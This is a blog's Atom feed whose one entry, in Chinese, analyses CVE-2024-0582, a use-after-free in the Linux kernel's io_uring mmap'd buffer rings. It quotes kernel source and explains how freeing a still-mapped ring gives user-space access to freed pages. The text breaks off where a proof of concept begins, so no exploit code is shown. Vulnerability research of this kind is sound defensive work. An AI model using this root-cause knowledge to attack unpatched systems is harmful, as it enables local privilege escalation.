<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>arttnba3&#39;s blog</title>
  
  <subtitle>arttnba3的秘密小屋</subtitle>
  <link href="https://arttnba3.github.io/atom.xml" rel="self"/>
  
  <link href="https://arttnba3.github.io/"/>
  <updated>2025-03-13T22:12:42.185Z</updated>
  <id>https://arttnba3.github.io/</id>
  
  <author>
    <name>arttnba3</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>【CVE.0x0C】CVE-2024-0582 漏洞复现及简要分析</title>
    <link href="https://arttnba3.github.io/2025/02/22/CVE-0X0C-CVE-2024-0582/"/>
    <id>https://arttnba3.github.io/2025/02/22/CVE-0X0C-CVE-2024-0582/</id>
    <published>2025-02-21T18:33:26.000Z</published>
    <updated>2025-03-13T22:12:42.185Z</updated>
    
    <content type="html"><![CDATA[<p>Pwn 完一结算 io_uring 得了 MVP！mmap 就是躺赢狗！</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><p><a href="https://nvd.nist.gov/vuln/detail/cve-2024-0582">CVE-2024-0582</a> 是一个发生在 Linux kernel 的 <a href="https://man7.org/linux/man-pages/man7/io_uring.7.html">io_uring</a> 这一高性能异步 IO API 中的漏洞，得益于对使用 <code>IORING_REGISTER_PBUF_RING</code> 注册的 ring buffer 在 <code>mmap()</code> 映射的情况下存在可以在释放后仍被使用的 UAF 漏洞，攻击者可以通过该漏洞攻击内核以完成本地提权；该漏洞的 CVSS 分数为 <code>7.8</code> ，影响版本包括但不限于 <code>6.4~6.6.5</code> ，本文我们选用 <code>6.4</code> 版本的内核源码进行分析</p><p>在开始之前，请先自行了解 <code>IO_URING</code> 相关的基础知识</p><blockquote><p>等后面有更多时间了笔者再写几篇 <code>io_uring</code> 相关的博客，现在先🕊着：）</p></blockquote><h1 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01. 漏洞分析"></a>0x01. 漏洞分析</h1><h2 id="PBUF-RING-Internal"><a href="#PBUF-RING-Internal" class="headerlink" title="PBUF_RING Internal"></a>PBUF_RING Internal</h2><p>众所周知 <code>IO_URING</code> 提供了下面三个新的系统调用：</p><ul><li><code>io_uring_setup()</code>：创建 <code>io_uring</code> 上下文，主要是创建一个 SQ 队列与一个 CQ 队列，并指定 queue 的元素数量；该系统调用会返回一个文件描述符以供我们进行后续操作</li><li><code>io_uring_register()</code>：操作用于异步 I&#x2F;O 的<strong>文件或用户缓冲区</strong>（files or user buffers），主要有注册（在内核中创建新的缓冲区）、更新（更新缓冲区内容）、注销（释放缓冲区）等操作，已经注册的缓冲区大小无法调整</li><li><code>io_uring_enter()</code>：提交新的 I&#x2F;O 请求，可以选择是否等待 I&#x2F;O 完成</li></ul><p>对于 <code>io_uring_register()</code> ，其系统调用原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">SYSCALL_DEFINE4(io_uring_register, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, fd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, opcode,<br><span class="hljs-type">void</span> __user *, arg, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, nr_args)<br></code></pre></td></tr></table></figure><p>在其核心逻辑的 <a href="https://elixir.bootlin.com/linux/v6.5/C/ident/__io_uring_register">__io_uring_register()</a> 函数当中有一个大的 <code>switch</code> 来为不同的 opcode 调用不同的处理函数，我们主要关注于与 <code>PBUF_RING</code> 相关的部分</p><h3 id="I-注册：IORING-REGISTER-PBUF-RING"><a href="#I-注册：IORING-REGISTER-PBUF-RING" class="headerlink" title="I. 注册：IORING_REGISTER_PBUF_RING"></a>I. 注册：IORING_REGISTER_PBUF_RING</h3><p>对于这个漏洞我们主要关注当 <code>opcode == IORING_REGISTER_PBUF_RING</code> 的情况，该 opcode 意味着注册一个环形缓冲区，其最终会调用到 <a href="https://elixir.bootlin.com/linux/v6.5/C/ident/io_register_pbuf_ring">io_register_pbuf_ring()</a> 函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">io_register_pbuf_ring</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> io_ring_ctx *ctx, <span class="hljs-type">void</span> __user *arg)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring_buf_reg</span> <span class="hljs-title">reg</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_buffer_list</span> *<span class="hljs-title">bl</span>, *<span class="hljs-title">free_bl</span> =</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">int</span> ret;<br><br><span class="hljs-keyword">if</span> (copy_from_user(&amp;reg, arg, <span class="hljs-keyword">sizeof</span>(reg)))<br><span class="hljs-keyword">return</span> -EFAULT;<br><br><span class="hljs-keyword">if</span> (reg.resv[<span class="hljs-number">0</span>] || reg.resv[<span class="hljs-number">1</span>] || reg.resv[<span class="hljs-number">2</span>])<br><span class="hljs-keyword">return</span> -EINVAL;<br><span class="hljs-keyword">if</span> (reg.flags &amp; ~IOU_PBUF_RING_MMAP)<br><span class="hljs-keyword">return</span> -EINVAL;<br><span class="hljs-keyword">if</span> (!(reg.flags &amp; IOU_PBUF_RING_MMAP)) &#123;<br><span class="hljs-keyword">if</span> (!reg.ring_addr)<br><span class="hljs-keyword">return</span> -EFAULT;<br><span class="hljs-keyword">if</span> (reg.ring_addr &amp; ~PAGE_MASK)<br><span class="hljs-keyword">return</span> -EINVAL;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> (reg.ring_addr)<br><span class="hljs-keyword">return</span> -EINVAL;<br>&#125;<br><br><span class="hljs-keyword">if</span> (!is_power_of_2(reg.ring_entries))<br><span class="hljs-keyword">return</span> -EINVAL;<br><br><span class="hljs-comment">/* cannot disambiguate full vs empty due to head/tail size */</span><br><span class="hljs-keyword">if</span> (reg.ring_entries &gt;= <span class="hljs-number">65536</span>)<br><span class="hljs-keyword">return</span> -EINVAL;<br><br><span class="hljs-keyword">if</span> (unlikely(reg.bgid &lt; BGID_ARRAY &amp;&amp; !ctx-&gt;io_bl)) &#123;<br><span class="hljs-type">int</span> ret = io_init_bl_list(ctx);<br><span class="hljs-keyword">if</span> (ret)<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br><br>bl = io_buffer_get_list(ctx, reg.bgid);<br><span class="hljs-keyword">if</span> (bl) &#123;<br><span class="hljs-comment">/* if mapped buffer ring OR classic exists, don&#x27;t allow */</span><br><span class="hljs-keyword">if</span> (bl-&gt;is_mapped || !list_empty(&amp;bl-&gt;buf_list))<br><span class="hljs-keyword">return</span> -EEXIST;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>free_bl = bl = kzalloc(<span class="hljs-keyword">sizeof</span>(*bl), GFP_KERNEL);<br><span class="hljs-keyword">if</span> (!bl)<br><span class="hljs-keyword">return</span> -ENOMEM;<br>&#125;<br><br><span class="hljs-keyword">if</span> (!(reg.flags &amp; IOU_PBUF_RING_MMAP))<br>ret = io_pin_pbuf_ring(&amp;reg, bl);<br><span class="hljs-keyword">else</span><br>ret = io_alloc_pbuf_ring(&amp;reg, bl);<br><br><span class="hljs-keyword">if</span> (!ret) &#123;<br>bl-&gt;nr_entries = reg.ring_entries;<br>bl-&gt;mask = reg.ring_entries - <span class="hljs-number">1</span>;<br><br>io_buffer_add_list(ctx, bl, reg.bgid);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>kfree(free_bl);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>略过各种参数检查等，我们主要关注其核心逻辑：</p><ul><li>首先调用 <a href="https://elixir.bootlin.com/linux/v6.5/C/ident/io_buffer_get_list">io_buffer_get_list()</a> 获取已经存在的 <code>io_buffer_list</code> 结构体，如果不存在则分配</li><li>如果请求中带有 <code>IOU_PBUF_RING_MMAP</code> 标志位，调用 <a href="https://elixir.bootlin.com/linux/v6.5/C/ident/io_alloc_pbuf_ring">io_alloc_pbuf_ring()</a> 由内核分配连续页面，否则调用 <a href="https://elixir.bootlin.com/linux/v6.5/C/ident/io_pin_pbuf_ring">io_pin_pbuf_ring()</a> 将来自用户态的页面 pin 到 ring 上</li><li>完成后将结果写入前面分配的 <code>io_buffer_list</code> 结构体中记录，并将该  <code>io_buffer_list</code> 放到当前的上下文中</li></ul><p>这里的子标志位主要用来指示 ring buffer 的分配者，若设置了 <code>IOU_PBUF_RING_MMAP</code> 意味着由内核分配环形缓冲区的内存，之后用户态应用使用 <code>mmap()</code> 映射以访问：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Flags for IORING_REGISTER_PBUF_RING.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * IOU_PBUF_RING_MMAP:If set, kernel will allocate the memory for the ring.</span><br><span class="hljs-comment"> *The application must not set a ring_addr in struct</span><br><span class="hljs-comment"> *io_uring_buf_reg, instead it must subsequently call</span><br><span class="hljs-comment"> *mmap(2) with the offset set as:</span><br><span class="hljs-comment"> *IORING_OFF_PBUF_RING | (bgid &lt;&lt; IORING_OFF_PBUF_SHIFT)</span><br><span class="hljs-comment"> *to get a virtual mapping for the ring.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> &#123;</span><br>IOU_PBUF_RING_MMAP= <span class="hljs-number">1</span>,<br>&#125;;<br></code></pre></td></tr></table></figure><blockquote><p>若未设置该标志位，则意味着由用户态程序提供对应的页面，此时内核会调用 <a href="https://elixir.bootlin.com/linux/v6.5/C/ident/io_pin_pages">io_pin_pages()</a> 并最终调用 <a href="https://elixir.bootlin.com/linux/v6.5/C/ident/pin_user_pages">pin_user_pages()</a> 完成这一操作</p></blockquote><p>因为我们的漏洞出现在和 <code>mmap()</code> 相关的路径上，因此我们主要关注调用 <a href="https://elixir.bootlin.com/linux/v6.5/C/ident/io_alloc_pbuf_ring">io_alloc_pbuf_ring()</a> 这一路径，该最终会调用 <code>__get_free_pages()</code> 分配空闲页面：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">io_alloc_pbuf_ring</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> io_uring_buf_reg *reg,</span><br><span class="hljs-params">      <span class="hljs-keyword">struct</span> io_buffer_list *bl)</span><br>&#123;<br><span class="hljs-type">gfp_t</span> gfp = GFP_KERNEL_ACCOUNT | __GFP_ZERO | __GFP_NOWARN | __GFP_COMP;<br><span class="hljs-type">size_t</span> ring_size;<br><span class="hljs-type">void</span> *ptr;<br><br>ring_size = reg-&gt;ring_entries * <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> io_uring_buf_ring);<br>ptr = (<span class="hljs-type">void</span> *) __get_free_pages(gfp, get_order(ring_size));<br><span class="hljs-keyword">if</span> (!ptr)<br><span class="hljs-keyword">return</span> -ENOMEM;<br><br>bl-&gt;buf_ring = ptr;<br>bl-&gt;is_mapped = <span class="hljs-number">1</span>;<br>bl-&gt;is_mmap = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>分配的结构大概长这个样子：</p><p><img src="https://s2.loli.net/2025/03/13/nzrlJ62up7TomCy.png"></p><h3 id="II-注销：IORING-UNREGISTER-PBUF-RING"><a href="#II-注销：IORING-UNREGISTER-PBUF-RING" class="headerlink" title="II. 注销：IORING_UNREGISTER_PBUF_RING"></a>II. 注销：IORING_UNREGISTER_PBUF_RING</h3><p>有注册就有注销，有内存分配就有内存释放，注销 <code>PBUF_RING</code> 对应的 opcode 为 <code>IORING_UNREGISTER_PBUF_RING</code> ，内核会调用到 <a href="https://elixir.bootlin.com/linux/v6.5/C/ident/io_unregister_pbuf_ring">io_unregister_pbuf_ring()</a> 进行处理：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">io_unregister_pbuf_ring</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> io_ring_ctx *ctx, <span class="hljs-type">void</span> __user *arg)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring_buf_reg</span> <span class="hljs-title">reg</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_buffer_list</span> *<span class="hljs-title">bl</span>;</span><br><br><span class="hljs-keyword">if</span> (copy_from_user(&amp;reg, arg, <span class="hljs-keyword">sizeof</span>(reg)))<br><span class="hljs-keyword">return</span> -EFAULT;<br><span class="hljs-keyword">if</span> (reg.resv[<span class="hljs-number">0</span>] || reg.resv[<span class="hljs-number">1</span>] || reg.resv[<span class="hljs-number">2</span>])<br><span class="hljs-keyword">return</span> -EINVAL;<br><span class="hljs-keyword">if</span> (reg.flags)<br><span class="hljs-keyword">return</span> -EINVAL;<br><br>bl = io_buffer_get_list(ctx, reg.bgid);<br><span class="hljs-keyword">if</span> (!bl)<br><span class="hljs-keyword">return</span> -ENOENT;<br><span class="hljs-keyword">if</span> (!bl-&gt;is_mapped)<br><span class="hljs-keyword">return</span> -EINVAL;<br><br>__io_remove_buffers(ctx, bl, <span class="hljs-number">-1U</span>);<br><span class="hljs-keyword">if</span> (bl-&gt;bgid &gt;= BGID_ARRAY) &#123;<br>xa_erase(&amp;ctx-&gt;io_bl_xa, bl-&gt;bgid);<br>kfree(bl);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>不难看出其核心逻辑为：</p><ul><li>首先调用 <a href="https://elixir.bootlin.com/linux/v6.5/C/ident/io_buffer_get_list">io_buffer_get_list()</a> 获取已经存在的 <code>io_buffer_list</code> 结构体，如果不存在则返回</li><li>接下来调用 <a href="https://elixir.bootlin.com/linux/v6.5/C/ident/__io_remove_buffers">__io_remove_buffers()</a> 释放  <code>io_buffer_list</code>  当中的页面</li><li>最后调用 <a href="https://elixir.bootlin.com/linux/v6.5/C/ident/xa_erase">xa_erase()</a> 从上下文中移除该 <code>io_buffer_list</code> 并释放</li></ul><p>在看 <a href="https://elixir.bootlin.com/linux/v6.5/C/ident/__io_remove_buffers">__io_remove_buffers()</a> 之前，我们首先回去看 <a href="https://elixir.bootlin.com/linux/v6.5/C/ident/io_alloc_pbuf_ring">io_alloc_pbuf_ring()</a> ，注意到 <code>io_buffer_list</code> 这些成员的赋值：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">io_alloc_pbuf_ring</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> io_uring_buf_reg *reg,</span><br><span class="hljs-params">      <span class="hljs-keyword">struct</span> io_buffer_list *bl)</span><br>&#123;<br><span class="hljs-comment">/* ... */</span><br>bl-&gt;is_mapped = <span class="hljs-number">1</span>;<br>bl-&gt;is_mmap = <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p>因此在  <a href="https://elixir.bootlin.com/linux/v6.5/C/ident/__io_remove_buffers">__io_remove_buffers()</a> 当中，我们会进入下面的路径将前面分配的页面释放掉：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> __io_remove_buffers(<span class="hljs-keyword">struct</span> io_ring_ctx *ctx,<br>       <span class="hljs-keyword">struct</span> io_buffer_list *bl, <span class="hljs-type">unsigned</span> nbufs)<br>&#123;<br><span class="hljs-type">unsigned</span> i = <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">/* shouldn&#x27;t happen */</span><br><span class="hljs-keyword">if</span> (!nbufs)<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">if</span> (bl-&gt;is_mapped) &#123;<br>i = bl-&gt;buf_ring-&gt;tail - bl-&gt;head;<br><span class="hljs-keyword">if</span> (bl-&gt;is_mmap) &#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><br>page = virt_to_head_page(bl-&gt;buf_ring);<br><span class="hljs-keyword">if</span> (put_page_testzero(page))<br>free_compound_page(page);<br>bl-&gt;buf_ring = <span class="hljs-literal">NULL</span>;<br>bl-&gt;is_mmap = <span class="hljs-number">0</span>;<br>&#125; <span class="hljs-comment">/* ... */</span><br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>在后面的版本中释放页面的逻辑会从使用 <code>put_page_testzero()</code> 换成 <code>folio_put(virt_to_folio(bl-&gt;buf_ring));</code> ，因此在修复该漏洞的 commit 当中你看到的是去除掉了 <code>folio_put()</code> 函数，但本质上的逻辑是一样的</p></blockquote><h3 id="III-使用：io-uring-mmap"><a href="#III-使用：io-uring-mmap" class="headerlink" title="III. 使用：io_uring_mmap"></a>III. 使用：io_uring_mmap</h3><p>我们如何从用户空间访问  <a href="https://elixir.bootlin.com/linux/v6.5/C/ident/io_alloc_pbuf_ring">io_alloc_pbuf_ring()</a> 分配的内存？内核通过 <code>mmap()</code>  为我们提供了一个方便快捷的途径，当我们对一个 <code>io_uring</code> 的 fd 使用 <code>mmap()</code> 进行映射时，内核最终会调用到 <a href="https://elixir.bootlin.com/linux/v6.5/C/ident/io_uring_mmap">io_uring_mmap()</a> 函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __cold <span class="hljs-type">int</span> <span class="hljs-title function_">io_uring_mmap</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-keyword">struct</span> vm_area_struct *vma)</span><br>&#123;<br><span class="hljs-type">size_t</span> sz = vma-&gt;vm_end - vma-&gt;vm_start;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> pfn;<br><span class="hljs-type">void</span> *ptr;<br><br>ptr = io_uring_validate_mmap_request(file, vma-&gt;vm_pgoff, sz);<br><span class="hljs-keyword">if</span> (IS_ERR(ptr))<br><span class="hljs-keyword">return</span> PTR_ERR(ptr);<br><br>pfn = virt_to_phys(ptr) &gt;&gt; PAGE_SHIFT;<br><span class="hljs-keyword">return</span> remap_pfn_range(vma, vma-&gt;vm_start, pfn, sz, vma-&gt;vm_page_prot);<br>&#125;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> <span class="hljs-title">io_uring_fops</span> =</span> &#123;<br>.release= io_uring_release,<br>.mmap= io_uring_mmap,<br></code></pre></td></tr></table></figure><p>在 <a href="https://elixir.bootlin.com/linux/v6.5/C/ident/io_uring_validate_mmap_request">io_uring_validate_mmap_request()</a> 函数中首先会根据 <code>mmap()</code> 的 <code>offset</code> 参数判断具体操作，这里我们也可以看出对于 <code>io_uring</code> 而言 <code>mmap()</code> 的最后一个参数并非传统的用来表示偏移值，而是使用高位数据作为 mask 表示不同类型，低位存储具体数据，这里我们主要关注和 <code>PBUF_RING</code> 相关的分支：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">io_uring_validate_mmap_request</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file,</span><br><span class="hljs-params">    <span class="hljs-type">loff_t</span> pgoff, <span class="hljs-type">size_t</span> sz)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_ring_ctx</span> *<span class="hljs-title">ctx</span> =</span> file-&gt;private_data;<br><span class="hljs-type">loff_t</span> offset = pgoff &lt;&lt; PAGE_SHIFT;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">void</span> *ptr;<br><br><span class="hljs-comment">/* Don&#x27;t allow mmap if the ring was setup without it */</span><br><span class="hljs-keyword">if</span> (ctx-&gt;flags &amp; IORING_SETUP_NO_MMAP)<br><span class="hljs-keyword">return</span> ERR_PTR(-EINVAL);<br><br><span class="hljs-keyword">switch</span> (offset &amp; IORING_OFF_MMAP_MASK) &#123;<br><span class="hljs-keyword">case</span> IORING_OFF_SQ_RING:<br><span class="hljs-keyword">case</span> IORING_OFF_CQ_RING:<br>ptr = ctx-&gt;rings;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> IORING_OFF_SQES:<br>ptr = ctx-&gt;sq_sqes;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> IORING_OFF_PBUF_RING: &#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> bgid;<br><br>bgid = (offset &amp; ~IORING_OFF_MMAP_MASK) &gt;&gt; IORING_OFF_PBUF_SHIFT;<br>mutex_lock(&amp;ctx-&gt;uring_lock);<br>ptr = io_pbuf_get_address(ctx, bgid);<br>mutex_unlock(&amp;ctx-&gt;uring_lock);<br><span class="hljs-keyword">if</span> (!ptr)<br><span class="hljs-keyword">return</span> ERR_PTR(-EINVAL);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">return</span> ERR_PTR(-EINVAL);<br>&#125;<br><br>page = virt_to_head_page(ptr);<br><span class="hljs-keyword">if</span> (sz &gt; page_size(page))<br><span class="hljs-keyword">return</span> ERR_PTR(-EINVAL);<br><br><span class="hljs-keyword">return</span> ptr;<br>&#125;<br></code></pre></td></tr></table></figure><p><a href="https://elixir.bootlin.com/linux/v6.5/C/ident/io_pbuf_get_address">io_pbuf_get_address</a> 的逻辑就简单很多，主要就是取出我们前面分配的 <code>buf_ring</code> ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">io_pbuf_get_address</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> io_ring_ctx *ctx, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> bgid)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_buffer_list</span> *<span class="hljs-title">bl</span>;</span><br><br>bl = io_buffer_get_list(ctx, bgid);<br><span class="hljs-keyword">if</span> (!bl || !bl-&gt;is_mmap)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-keyword">return</span> bl-&gt;buf_ring;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h2><p>我们其实不难看出漏洞出现在对内存所有权的严格管控，当我们将 <code>bl-&gt;buf_ring</code> 的内存通过 <code>mmap()</code> 映射出去之后， <strong>居然仍旧能够直接通过 io_unregister_pbuf_ring 函数将这块内存给释放掉</strong> ，由此我们先进行内存分配、再进行 <code>mmap()</code> 、最后再释放这块内存就直接有一个 UAF 了： <strong>我们可以通过 mmap() 的内存区域直接读写释放掉的内内存页</strong> </p><p><img src="https://s2.loli.net/2025/03/14/3ovedsrfOby8KUw.png"></p><h2 id="Proof-Of-Concept"><a href="#Proof-Of-Concept" class="headerlink" title="Proof-Of-Concept"></a>Proof-Of-Concept</h2><p>这里笔者给出自己写的 POC，主要就是利用 UAF 漏洞在 <code>seq_file::seq_operations</code> 里瞎写一通造成 kernel panic：</p><blockquote><p>为什么用 liburing 而不是自己手搓 raw syscall？因为👴还没那么闲得慌</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 